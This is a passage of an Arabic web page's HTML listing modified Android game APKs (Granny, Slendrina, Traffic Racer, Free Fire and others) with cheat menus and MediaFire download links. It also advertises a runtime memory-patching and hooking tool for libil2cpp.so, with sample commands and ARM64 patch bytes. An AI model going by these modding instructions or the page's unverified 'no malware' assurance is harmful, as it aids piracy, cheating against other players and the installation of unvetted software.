+                            <h3 class="game-title">🧠 Brain Test 2 (الجزء الثاني)</h3>
+                            <p class="game-desc">الجزء الثاني من لعبة الألغاز الذكية الإصدار 1.24.10 بمعمارية ARM64 مع ميزة المكافآت اللامحدودة.</p>
+                        </div>
+                        
+                        <div class="mod-menu-preview" style="border-color: var(--warning-color); background: rgba(15, 23, 42, 0.9);">
+                            <div class="mod-menu-title" style="color: var(--warning-color);">⚠️ تنبيهات هامة للتشغيل الصحيح</div>
+                            <div style="font-size: 0.75rem; color: var(--text-secondary); line-height: 1.6; text-align: right; padding: 4px 6px;">
+                                <strong>• لتفعيل الميزات:</strong> اضغط على زر المكافأة، ثم اخرج من اللعبة (ولا تحذفها من الخلفية)، ثم ارجع إليها وستجد المكافأة.<br>
+                                <strong>• الميزة:</strong> تحصل على 20 مصباح في كل مرة، ويمكنك تجميع آلاف المصابيح بتكرار العملية.
+                            </div>
+                        </div>
+
+                        <ul class="features-list">
+                            <li><strong>الإصدار:</strong> 1.24.10 | <strong>المعمارية:</strong> Arm64</li>
+                            <li><strong>حجم الملف:</strong> 150.95 ميجابايت</li>
+                            <li><strong>الميزة:</strong> مكافأة لا نهائية (كل مكافأة = 20 مصباح)</li>
+                            <li><strong>نظام التشغيل:</strong> Android 7 (API 24) إلى Android 15 (API 35)</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Brain Test 2 (v1.24.10 - Arm64)', 'https://www.mediafire.com/file/4wyehjava4ng0z0/Brain_Test_2.zip/file')" class="btn">تحميل اللعبة (ZIP)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Brain Test 1 -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
+                            <h3 class="game-title">🧠 Brain Test: Tricky Puzzles</h3>
+                            <p class="game-desc">الجزء الأول من لعبة الألغاز الذكية الإصدار 2.770.0 بمعمارية ARM64 مع طريقة مخصصة لجمع آلاف المصابيح.</p>
+                        </div>
+                        
+                        <div class="mod-menu-preview" style="border-color: var(--warning-color); background: rgba(15, 23, 42, 0.9);">
+                            <div class="mod-menu-title" style="color: var(--warning-color);">⚠️ تحذير أمني هام وتوافق الأجهزة</div>
+                            <div style="font-size: 0.75rem; color: var(--text-secondary); line-height: 1.5; text-align: right; padding: 2px;">
+                                • النسخة مخصصة حصرياً لمعمارية الأجهزة الحديثة <strong>Arm64</strong>.<br>
+                                • أجهزة Android 12 إلى 16: يتم الخروج والدخول السريع لتكرار الجائزة.<br>
+                                • أجهزة أقل من Android 12: يجب الخروج الكامل من اللعبة وإعادة فتحها كلياً لتفعيل الجائزة.
+                            </div>
+                        </div>
+
+                        <ul class="features-list">
+                            <li><strong>الإصدار:</strong> 2.770.0 | <strong>المعمارية:</strong> Arm64</li>
+                            <li>طريقة تفعيل الميزات: العب حتى Level 2 ثم اتبع طريقة الخروج والدخول للحصول على 40 مصباح في كل مرة.</li>
+                            <li>جمع آلاف المصابيح والمساعدات بسهولة تامة</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Brain Test 1 (v2.770.0 - Arm64)', 'https://www.mediafire.com/file/uj3jvcehuckcmj3/Game+MOD.zip/file')" class="btn">تحميل اللعبة مع الشرح (ZIP)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Slendrina the Cellar -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
+                            <h3 class="game-title">Slendrina the Cellar (الجزء الأول)</h3>
+                            <p class="game-desc">لعبة الرعب الأسطورية الإصدار الأول بمعمارية arm64 مع قائمة غش مخصصة وبدون إعلانات.</p>
+                        </div>
+                        
+                        <div class="mod-menu-preview">
+                            <div class="mod-menu-title">⚡ DZ SECURITY LAB ⚡</div>
+                            <div class="mod-grid">
+                                <div class="mod-btn-sample purple" onclick="toggleMod(this, 'تجميد Slendrina')">❄️ تجميد: OFF</div>
+                                <div class="mod-close-btn" onclick="hideMenu(this)">X</div>
+                            </div>
+                            <div class="mod-btn-sample purple" style="margin-top: 4px;" onclick="toggleMod(this, 'عدم موت')">🛡️ عدم موت: OFF</div>
+                        </div>
+
+                        <ul class="features-list">
+                            <li>معمارية ARM64 المخصصة للأجهزة الحديثة</li>
+                            <li>تجميد Slendrina بالكامل (Freeze Slendrina)</li>
+                            <li>ميزة عدم الموت (God Mode) وحرية الاستكشاف</li>
+                            <li>نسخة خالية تماماً من الإعلانات (No Ads)</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Slendrina the Cellar (الجزء الأول)', 'https://www.mediafire.com/file/h09o2wirw6d5gpp/Slendrina+the+Cellar.apk/file')" class="btn">تحميل اللعبة (APK)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Traffic Racer (64-bit) -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
+                            <h3 class="game-title">Traffic Racer (نسخة 64-bit)</h3>
+                            <p class="game-desc">لعبة السباق الشهيرة بمعمارية 64-bit مع نقود كثيرة وجميع السيارات مفتوحة.</p>
+                        </div>
+                        
+                        <div class="mod-menu-preview" style="border-color: var(--warning-color); background: rgba(15, 23, 42, 0.9);">
+                            <div class="mod-menu-title" style="color: var(--warning-color);">⚠️ ملاحظة هامة لتشغيل العملات</div>
+                            <div style="font-size: 0.75rem; color: var(--text-secondary); line-height: 1.5; text-align: right; padding: 2px;">
+                                • ليتم تشغيل العملات وتفعيلها بشكل صحيح داخل اللعبة، يُرجى الخروج التام من اللعبة وإعادة فتحها من جديد.
+                            </div>
+                        </div>
+
+                        <ul class="features-list">
+                            <li>نقود كثيرة وغير محدودة</li>
+                            <li>جميع السيارات مفتوحة (All Cars Unlocked)</li>
+                            <li>إصدار 64-bit متوافق مع الأجهزة الحديثة</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Traffic Racer (نسخة 64-bit)', 'https://www.mediafire.com/file/fy6hcx8quiqrutg/Traffic+Racer.apk/file')" class="btn">تحميل اللعبة (APK)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Free Fire -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
+                            <h3 class="game-title">Free Fire (نسخة 32-bit)</h3>
+                            <p class="game-desc">الإصدار 1.128.2 المخصص للأجهزة الضعيفة والقوية لتعمل بسلاسة فائقة وبدون تقطيع.</p>
+                        </div>
+                        
+                        <div class="mod-menu-preview" style="border-color: var(--warning-color); background: rgba(15, 23, 42, 0.9);">
+                            <div class="mod-menu-title" style="color: var(--warning-color);">⚠️ ملاحظة هامة للتثبيت والتشغيل</div>
+                            <div style="font-size: 0.75rem; color: var(--text-secondary); line-height: 1.5; text-align: right; padding: 2px;">
+                                • لتفعيل النسخة على أجهزة 64، عطل التحديث التلقائي وثبتها عبر تطبيق يدعم ملفات <code>.apks</code>.
+                            </div>
+                        </div>
+
+                        <ul class="features-list">
+                            <li>حزمة اللعبة: <code>com.dts.freefireth</code></li>
+                            <li>الإصدار: <code>1.128.2</code> (نسخة 32)</li>
+                            <li>أداء سلس ومحسّن لكافة الأجهزة</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Free Fire (نسخة 32-bit)', 'https://www.mediafire.com/file/530v3m4u97umj66/Free+Fire_1.128.2.apks/file')" class="btn">تحميل اللعبة (.apks)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Horror Sponge Granny -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
+                            <h3 class="game-title">Horror Sponge Granny V1.8</h3>
+                            <p class="game-desc">لعبة الرعب المميزة مع قائمة غش مخصصة لتفعيل ميزات تجميد الجدة للنجاة.</p>
+                        </div>
+                        
+                        <div class="mod-menu-preview">
+                            <div class="mod-menu-title">DZ SECURITY LAB</div>
+                            <div class="mod-grid">
+                                <div class="mod-btn-sample purple" onclick="toggleMod(this, 'تجميد الجدة')">❄️ تجميد الجدة: OFF</div>
+                                <div class="mod-close-btn" onclick="hideMenu(this)">X</div>
+                            </div>
+                        </div>
+
+                        <ul class="features-list">
+                            <li>تجميد الجدة بالكامل (Freeze Granny)</li>
+                            <li>قائمة غش تفاعلية وسهلة الاستخدام</li>
+                            <li>إصدار V1.8 المعدل خصيصاً</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Horror Sponge Granny V1.8', 'https://www.mediafire.com/file/05s7kr3kq7o4wnw/Horror+Sponge.apk/file')" class="btn">تحميل اللعبة (APK)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Traffic Racer (32-bit) -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
+                            <h3 class="game-title">Traffic Racer (نسخة 32-bit)</h3>
+                            <p class="game-desc">لعبة السباق الممتعة (نسخة 32) لتعمل بسلاسة فائقة على الأجهزة الضعيفة والقوية مع فتح الميزات.</p>
+                        </div>
+                        
+                        <ul class="features-list" style="margin-top: 12px;">
+                            <li>إصدار 32-bit متوافق مع الأجهزة الضعيفة والقوية</li>
+                            <li>فتح جميع السيارات (All Cars Unlocked)</li>
+                            <li>أموال وعملات غير محدودة (Unlimited Money)</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Traffic Racer (نسخة 32-bit)', 'https://www.mediafire.com/file/32ks4ysha7wc0li/traffic-.apk/file')" class="btn">تحميل اللعبة (APK)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Slendrina the Cellar 2 -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
+                            <h3 class="game-title">Slendrina the Cellar 2</h3>
+                            <p class="game-desc">لعبة الرعب مع قائمة غش مبرمجة ومطورة حصرياً عبر قناة DZ Security Lab.</p>
+                        </div>
+                        
+                        <div class="mod-menu-preview">
+                            <div class="mod-menu-title">⚡ DZ SECURITY LAB ⚡</div>
+                            <div class="mod-grid">
+                                <div class="mod-btn-sample" onclick="toggleMod(this, 'عدم موت')">🛡️ عدم موت: OFF</div>
+                                <div class="mod-btn-sample" onclick="toggleMod(this, 'تجميد')">❄️ تجميد: OFF</div>
+                            </div>
+                            <div class="mod-btn-sample purple" style="margin-top: 4px;" onclick="alert('تم تفعيل: حذف مشهد')">🗑️ حذف مشهد</div>
+                        </div>
+
+                        <ul class="features-list">
+                            <li>حماية كاملة (God Mode)</li>
+                            <li>تجميد الأعداء وإيقافهم</li>
+                            <li>زر تفاعلي لحذف المشاهد المرعبة</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Slendrina the Cellar 2', 'https://www.mediafire.com/file/jko6w1ft6uf668m/Slendrina+the+Cellar+2.apk/file')" class="btn">تحميل اللعبة (APK)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Ninja Arashi -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
+                            <h3 class="game-title">Ninja Arashi</h3>
+                            <p class="game-desc">مغامرة النينجا المشوقة مع قائمة غش مخصصة لتجميد الأعداء وعدم الموت.</p>
+                        </div>
+                        
+                        <div class="mod-menu-preview">
+                            <div class="mod-menu-title">DZ SECURITY LAB</div>
+                            <div class="mod-grid">
+                                <div class="mod-btn-sample" onclick="toggleMod(this, 'تجميد الأعداء')">تجميد: OFF</div>
+                                <div class="mod-close-btn" onclick="hideMenu(this)">X</div>
+                            </div>
+                            <div class="mod-btn-sample purple" style="margin-top: 4px;" onclick="toggleMod(this, 'عدم الموت')">🛡️ عدم موت: OFF</div>
+                        </div>
+
+                        <ul class="features-list">
+                            <li>تجميد الأعداء داخل المراحل</li>
+                            <li>ميزة عدم الموت (God Mode)</li>
+                            <li>تحكم كامل عبر قائمة غش مدمجة</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Ninja Arashi', 'https://www.mediafire.com/file/snbt7u8jhwqsjs8/Ninja_Arashi.apk/file')" class="btn">تحميل اللعبة (APK)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Cursed House -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
+                            <h3 class="game-title">Cursed House Multiplayer (GMM)</h3>
+                            <p class="game-desc">لعبة الرعب الجماعية مع قائمة غش مخصصة لتجميد الجدة والتحكم باللعب.</p>
+                        </div>
+                        
+                        <div class="mod-menu-preview">
+                            <div class="mod-menu-title">DZ SECURITY LAB</div>
+                            <div class="mod-grid">
+                                <div class="mod-btn-sample purple" onclick="toggleMod(this, 'تجميد الجدة الجماعي')">❄️ تجميد الجدة: OFF</div>
+                                <div class="mod-close-btn" onclick="hideMenu(this)">X</div>
+                            </div>
+                        </div>
+
+                        <ul class="features-list">
+                            <li>تجميد الجدة (Freeze Granny)</li>
+                            <li>قائمة غش تفاعلية وسريعة</li>
+                            <li>دعم اللعب الجماعي المعدل</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Cursed House Multiplayer (GMM)', 'https://www.mediafire.com/file/r4thlp0dzggl3wy/MOD.MENU.apk/file')" class="btn">تحميل اللعبة (APK)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Gun Strike -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
+                            <h3 class="game-title">Gun Strike</h3>
+                            <p class="game-desc">لعبة الأكشن والحرب مع قائمة غش مخصصة لميزة عدم الموت والسيطرة على المعركة.</p>
+                        </div>
+                        
+                        <div class="mod-menu-preview">
+                            <div class="mod-menu-title">DZ SECURITY LAB</div>
+                            <div class="mod-grid">
+                                <div class="mod-btn-sample purple" onclick="toggleMod(this, 'عدم الموت - Gun Strike')">🛡️ عدم موت: OFF</div>
+                                <div class="mod-close-btn" onclick="hideMenu(this)">X</div>
+                            </div>
+                        </div>
+
+                        <ul class="features-list">
+                            <li>ميزة عدم الموت (God Mode)</li>
+                            <li>قائمة غش تفاعلية داخل اللعبة</li>
+                            <li>تجربة أكشن حماسية بلا هزيمة</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Gun Strike', 'https://www.mediafire.com/file/tst11yk9ngvjpuq/Gun+Strik.apk/file')" class="btn">تحميل اللعبة (APK)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Evil Nun -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
+                            <h3 class="game-title">Evil Nun</h3>
+                            <p class="game-desc">لعبة الرعب الشهيرة مع قائمة غش مخصصة لتجميد الراهبة وحرية الاستكشاف.</p>
+                        </div>
+                        
+                        <div class="mod-menu-preview">
+                            <div class="mod-menu-title">DZ SECURITY LAB</div>
+                            <div class="mod-grid">
+                                <div class="mod-btn-sample purple" onclick="toggleMod(this, 'تجميد الراهبة')">❄️ تجميد الراهبة: OFF</div>
+                                <div class="mod-close-btn" onclick="hideMenu(this)">X</div>
+                            </div>
+                        </div>
+
+                        <ul class="features-list">
+                            <li>تجميد الراهبة (Freeze Nun)</li>
+                            <li>قائمة غش تفاعلية وسهلة الاستخدام</li>
+                            <li>استكشاف المدرسة وحل الألغاز بأمان</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Evil Nun', 'https://www.mediafire.com/file/4wujo0vby1po11m/Evil_Nun.apk/file')" class="btn">تحميل اللعبة (APK)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Subway City -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
+                            <h3 class="game-title">Subway City</h3>
+                            <p class="game-desc">لعبة الجري والمغامرة الممتعة في شوارع المدينة مع قائمة غش مخصصة لمنع الموت.</p>
+                        </div>
+                        
+                        <div class="mod-menu-preview">
+                            <div class="mod-menu-title">DZ SECURITY LAB</div>
+                            <div class="mod-grid">
+                                <div class="mod-btn-sample purple" onclick="toggleMod(this, 'عدم الموت - Subway City')">🛡️ عدم موت: OFF</div>
+                                <div class="mod-close-btn" onclick="hideMenu(this)">X</div>
+                            </div>
+                        </div>
+
+                        <ul class="features-list">
+                            <li>ميزة عدم الموت (God Mode)</li>
+                            <li>قائمة غش تفاعلية للتحكم الكامل</li>
+                            <li>مغامرة بلا حدود أو اصطدام مميت</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Subway City', 'https://www.mediafire.com/file/pscomj55tuxcjb3/Subway+City_2.3.0.apk/file')" class="btn">تحميل اللعبة (APK)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Granny 3 -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
+                            <h3 class="game-title">Granny 3</h3>
+                            <p class="game-desc">لعبة الرعب الشهيرة مع قائمة غش مخصصة لتجميد الجدة والجد لضمان النجاة.</p>
+                        </div>
+                        
+                        <div class="mod-menu-preview">
+                            <div class="mod-menu-title">DZ SECURITY LAB</div>
+                            <div class="mod-grid">
+                                <div class="mod-btn-sample purple" onclick="toggleMod(this, 'تجميد الجدة')">تجميد: OFF</div>
+                                <div class="mod-btn-sample purple" onclick="toggleMod(this, 'تجميد الجد')">تجميد2: OFF</div>
+                            </div>
+                        </div>
+
+                        <ul class="features-list">
+                            <li>تجميد الجدة (Freeze Granny)</li>
+                            <li>تجميد الجد (Freeze Grandpa)</li>
+                            <li>قائمة غش تفاعلية مطابقة لطلبك</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Granny 3', 'https://www.mediafire.com/file/b65kbe4s7idu4i2/Granny3_src_sign.apk/file')" class="btn">تحميل اللعبة (APK)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Granny Chapter Two -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
+                            <h3 class="game-title">Granny Chapter Two</h3>
+                            <p class="game-desc">الجزء الثاني من لعبة الرعب الأسطورية مع قائمة غش مخصصة لتجميد الجدة.</p>
+                        </div>
+                        
+                        <div class="mod-menu-preview">
+                            <div class="mod-menu-title">DZ SECURITY LAB</div>
+                            <div class="mod-grid">
+                                <div class="mod-btn-sample purple" onclick="toggleMod(this, 'تجميد الجدة - Chapter 2')">تجميد: OFF</div>
+                                <div class="mod-close-btn" onclick="hideMenu(this)">X</div>
+                            </div>
+                        </div>
+
+                        <ul class="features-list">
+                            <li>تجميد الجدة (Freeze Granny)</li>
+                            <li>قائمة غش تفاعلية مطابقة لطلبك</li>
+                            <li>استكشاف المنزل والهروب بأمان</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Granny Chapter Two', 'https://www.mediafire.com/file/sw7bvfh446xzgyb/Granny+Chapter+Two.apk/file')" class="btn">تحميل اللعبة (APK)</button>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <div id="page-tool" class="page-content">
+            <a href="#" class="back-to-home-btn" onclick="switchPage('games')">⬅ العودة إلى قائمة الألعاب</a>
+            
+            <h2 class="section-title">🛠️ قسم أداة المطور (Developer Tools)</h2>
+            
+            <div class="tool-card">
+                <div class="tool-header">
+                    <div class="tool-title">🔥 DZ_Scanner v7.1</div>
+                    <div class="tool-badge">Ultimate Hook Engine - بدون حقن دوال</div>
+                </div>
+                
+                <div style="display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 15px;">
+                    <span class="scanner-badge">📦 الإصدار 7.1</span>
+                    <span class="scanner-badge">📜 MIT License</span>
+                    <span class="scanner-badge">📱 Android</span>
+                    <span class="scanner-badge">📐 API 21+</span>
+                    <span class="scanner-badge">📏 الحجم ~45KB</span>
+                </div>
+
+                <p class="tool-desc">
+                    <strong>DZ_Scanner v7.1</strong> هي مكتبة Android احترافية لتحليل وتعديل الذاكرة في وقت التشغيل (Runtime Patching) لمعمارية <b>ARM64</b>. تم تصميمها خصيصاً لتحليل دوال مكتبة <code>libil2cpp.so</code> <strong>دون حقن دوال</strong> أو تعديل الملف الأصلي على القرص.
+                    <br><br>
+                    🆓 مجانية تماماً | 💪 قوية | 🕶️ خفية | 🔄 مرنة
+                </p>
+
+                <h4 style="color: var(--accent-color); margin: 15px 0 8px 0; font-size: 1.1rem;">🆕 ما الجديد في الإصدار v7.1؟</h4>
+                <div class="feature-grid-2">
+                    <div class="feature-item-compact">🔍 <b>/WX</b> فحص دالة ومراقبة استدعاءاتها</div>
+                    <div class="feature-item-compact">📦 <b>/dumpfunc</b> تفريغ بايتات الدالة</div>
+                    <div class="feature-item-compact">🔗 <b>/trace</b> تتبع استدعاءات الدالة المتسلسلة</div>
+                    <div class="feature-item-compact">🧬 <b>Register Patching</b> قراءة وتعديل السجلات</div>
+                    <div class="feature-item-compact">💰 <b>Value Patching</b> تعديل القيم (Int/Float)</div>
+                    <div class="feature-item-compact">📊 <b>Value Extraction</b> استخراج جميع القيم</div>
+                    <div class="feature-item-compact">💾 <b>Memory Dump</b> تفريغ الذاكرة إلى ملف</div>
+                    <div class="feature-item-compact">🔧 <b>Library Switching</b> تغيير المكتبة المستهدفة</div>
+                    <div class="feature-item-compact">🎯 <b>Hook System</b> هوكات متقدمة (6 أنواع)</div>
+                    <div class="feature-item-compact">🛡️ <b>Smart Breakpoints</b> نقاط توقف ذكية</div>
+                    <div class="feature-item-compact">📝 <b>Enhanced Logging</b> تسجيل مفصل مع توقيتات</div>
+                    <div class="feature-item-compact">🛡️ <b>Crash Protection</b> حماية كاملة من الكراش</div>
+                </div>
+
+                <h4 style="color: var(--accent-color); margin: 15px 0 8px 0; font-size: 1.1rem;">🏗️ المواصفات التقنية</h4>
+                <div style="background: rgba(5, 7, 12, 0.7); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; margin-bottom: 15px; font-size: 0.85rem; color: var(--text-secondary);">
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 4px 20px;">
+                        <div><b>اللغة:</b> C/C++ (Android NDK)</div>
+                        <div><b>المعمارية:</b> ARM64 (AArch64)</div>
+                        <div><b>الحد الأقصى للـ RVAs:</b> 10,000 عنوان</div>
+                        <div><b>الحد الأقصى للهوكات:</b> 128 هوك</div>
+                        <div><b>أنواع الهوك:</b> 6 أنواع</div>
+                        <div><b>ملف التكوين:</b> MOD.SH</div>
+                        <div><b>Root مطلوب؟</b> لا</div>
+                        <div><b>Android SDK:</b> 21+ (Android 5.0)</div>
+                    </div>
+                </div>
+
+                <h4 style="color: var(--accent-color); margin: 15px 0 8px 0; font-size: 1.1rem;">🎯 أنواع الهوكات</h4>
+                <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 15px; font-size: 0.85rem; color: var(--text-secondary);">
+                    <div style="background: rgba(5, 7, 12, 0.5); border: 1px solid var(--border-color); border-radius: 6px; padding: 6px 10px; text-align: center;">1. Jump</div>
+                    <div style="background: rgba(5, 7, 12, 0.5); border: 1px solid var(--border-color); border-radius: 6px; padding: 6px 10px; text-align: center;">2. Call</div>
+                    <div style="background: rgba(5, 7, 12, 0.5); border: 1px solid var(--border-color); border-radius: 6px; padding: 6px 10px; text-align: center;">3. Inline</div>
+                    <div style="background: rgba(5, 7, 12, 0.5); border: 1px solid var(--border-color); border-radius: 6px; padding: 6px 10px; text-align: center;">4. Conditional</div>
+                    <div style="background: rgba(5, 7, 12, 0.5); border: 1px solid var(--border-color); border-radius: 6px; padding: 6px 10px; text-align: center;">5. Chained</div>
+                    <div style="background: rgba(5, 7, 12, 0.5); border: 1px solid var(--border-color); border-radius: 6px; padding: 6px 10px; text-align: center;">6. Detour</div>
+                </div>
+
+                <h4 style="color: var(--accent-color); margin: 15px 0 8px 0; font-size: 1.1rem;">📂 تنسيق ملف التكوين (MOD.SH)</h4>
+                <div style="background: rgba(5, 7, 12, 0.9); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; margin-bottom: 15px; font-size: 0.78rem; color: var(--text-secondary); direction: ltr; text-align: left; overflow-x: auto; white-space: pre-wrap; word-break: break-all; font-family: monospace;">
+مسار الملف: /storage/emulated/0/Android/data/&lt;package_name&gt;/files/MOD.SH
+
+# ============================================================
+# ملف MOD.SH - DZ_Scanner v7.1
+# ============================================================
+
+# ====== تغيير المكتبة المستهدفة ======
+/Wlibil2cpp.so
+
+# ====== تأخير زمني ======
+/5
+
+# ====== أوامر التتبع والتحليل ======
+/WX 0x14549e4
+/dumpfunc 0x14549e4
+/trace 0x14549e4
+
+# ====== أوامر السجلات ======
+/regs 0x14549e4
+/reg 0x14549e4 x0=999
+/reg 0x14549e4 w1=100
+/reg 0x14549e4 s0=3.14
+
+# ====== استخراج القيم ======
+/int
+/float
+/int 0x14549e4 0x1454de4
+
+# ====== تفريغ الذاكرة ======
+dump memory_dump.bin
+
+# ====== نقاط التوقف ======
+/bp 0x14549e4
+/sbp 0x14549e4 smart_bp
+
+# ====== الهوكات ======
+/ahook 0x14549e4 hook_func
+/chook 0x14549e4
+/hook 0x14549e4 granny_hook
+/toggle 0x14549e4 1
+/rhook 0x14549e4
+
+# ====== تعديل القيم ======
+value 0x1454a8c 1.0 0.001
+
+# ====== تعديل RVAs ======
+0x14549e4: C0 03 5F D6  # RET
+0x14549e4: 1F 20 03 D5  # NOP
+
+# ====== مساعدة ======
+/help
+                </div>
+
+                <h4 style="color: var(--accent-color); margin: 15px 0 8px 0; font-size: 1.1rem;">🔧 التعليمات المدعومة</h4>
+                <div style="background: rgba(5, 7, 12, 0.7); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; margin-bottom: 15px; font-size: 0.8rem; color: var(--text-secondary); overflow-x: auto;">
+                    <table style="width: 100%; border-collapse: collapse; text-align: right;">
+                        <thead><tr style="border-bottom: 1px solid var(--border-color);"><th style="padding: 6px 8px;">الغرض</th><th style="padding: 6px 8px;">البايتات (Hex)</th><th style="padding: 6px 8px;">العدد</th><th style="padding: 6px 8px;">الشرح</th></tr></thead>
+                        <tbody>
+                            <tr><td style="padding: 4px 8px;">RET</td><td style="padding: 4px 8px; direction: ltr;">C0 03 5F D6</td><td style="padding: 4px 8px;">4</td><td style="padding: 4px 8px;">تعطيل الدالة بالكامل</td></tr>
+                            <tr><td style="padding: 4px 8px;">TRUE (1)</td><td style="padding: 4px 8px; direction: ltr;">20 00 80 52 C0 03 5F D6</td><td style="padding: 4px 8px;">8</td><td style="padding: 4px 8px;">إرجاع القيمة 1</td></tr>
+                            <tr><td style="padding: 4px 8px;">FALSE (0)</td><td style="padding: 4px 8px; direction: ltr;">00 00 80 52 C0 03 5F D6</td><td style="padding: 4px 8px;">8</td><td style="padding: 4px 8px;">إرجاع القيمة 0</td></tr>
+                            <tr><td style="padding: 4px 8px;">NOP</td><td style="padding: 4px 8px; direction: ltr;">1F 20 03 D5</td><td style="padding: 4px 8px;">4</td><td style="padding: 4px 8px;">لا تفعل شيئاً</td></tr>
+                            <tr><td style="padding: 4px 8px;">MOV W0, #100</td><td style="padding: 4px 8px; direction: ltr;">64 00 80 52 C0 03 5F D6</td><td style="padding: 4px 8px;">8</td><td style="padding: 4px 8px;">إرجاع 100</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="tool-actions">
+                    <button onclick="trackDownload('أداة المطور DZ_Scanner v7.1', 'https://www.mediafire.com/file/3mqremp0guqvrj5/DZ_Scanner_v7.1.zip/file')" class="tool-btn download">
+                        📥 تحميل أداة المطور (v7.1)
+                    </button>
+                    <a href="https://github.com/whdjv5si-dev/ADEMX/releases/tag/7.1" target="_blank" class="tool-btn info">
+                        📚 للمزيد من المعلومات (GitHub)
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="page-transparency" class="page-content">
+            <a href="#" class="back-to-home-btn" onclick="switchPage('games')">⬅ العودة إلى قائمة الألعاب</a>
+            
+            <h2 class="section-title">🛡️ صفحة الشفافية ودليل الأمان (Transparency & Security)</h2>
+            
+            <div class="transparency-card">
+                <h3>🔍 كيف تعمل التعديلات؟ (آلية العمل التقنية)</h3>
+                <p>
+                    نؤمن في <strong>DZ Security Lab</strong> بالشفافية الكاملة مع مستخدمينا والمطورين. جميع ملفات التعديل وقوائم الغش (Mod Menus) أو حزم التثبيت المقدمة هنا تعمل حصرياً ضمن نطاق بيئة اللعبة المعزولة (Sandbox).
+                </p>
+                <p>
+                    <strong>ما يفعله التعديل تقنياً:</strong> يقتصر التعديل على حقن كود برمجي بسيط أو تعديل قيم معينة داخل الذاكرة العشوائية (RAM) الخاصة اللعبة نفسها أثناء وقت التشغيل (Runtime).
+                </p>
+                <div class="safety-box">
+                    💡 <strong>تنويه أمان:</strong> جميع التعديلات مقتصرة على فتح الميزات داخل اللعبة فقط. لا تحتوي الملفات على أي أكواد ضارة أو خبيثة. يمكنك التحقق عبر موقع <a href="https://www.virustotal.com" target="_blank">VirusTotal</a> للاطمئنان الكامل بنفسك.
+                </div>
+            </div>
+        </div>
+
+        <div id="page-requests" class="page-content">
+            <a href="#" class="back-to-home-btn" onclick="switchPage('games')">⬅ العودة إلى قائمة الألعاب</a>
+            
